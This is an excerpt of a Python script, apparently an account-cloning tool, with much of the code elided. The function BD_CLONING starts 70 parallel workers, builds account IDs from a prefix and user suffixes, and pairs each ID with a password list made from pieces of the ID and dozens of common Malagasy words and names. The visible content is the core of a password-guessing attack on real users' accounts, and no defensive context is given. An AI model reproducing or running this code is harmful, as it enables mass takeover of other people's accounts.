...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'fanantenana','Fanantenana','malala','Malala','zanako','Zanako','felana','Felana','mahery','Mahery','fitiavana','Fitiavana','papako','Papako','mamako','Mamako','sarika','Sarika','sambatra','marinah','Marinah','jesosy','harena','Harena','tahiry','Tahiry','fanilo','Fanilo','faniry','Faniry','nilaina','Nilaina','nirina','Nirina','safidy','Safidy','valisoa','Valisoa','mahefa','Mahefa','mahandry','Mahandry','fitiavako','fanilo','anjarako','saholy','salohy','lalaina','tsilavina','tahina','anjara','nilaina','fanasina','hasina','jesosy','dadako','badoda','heritina','nomena','fandresena','finoana','fiderana','nantenaina','harena','tahiry','valisoa','tantely','tanjona','sarika','fanasina','felana','malalako','fanasina','mahery','seheno','santatra']
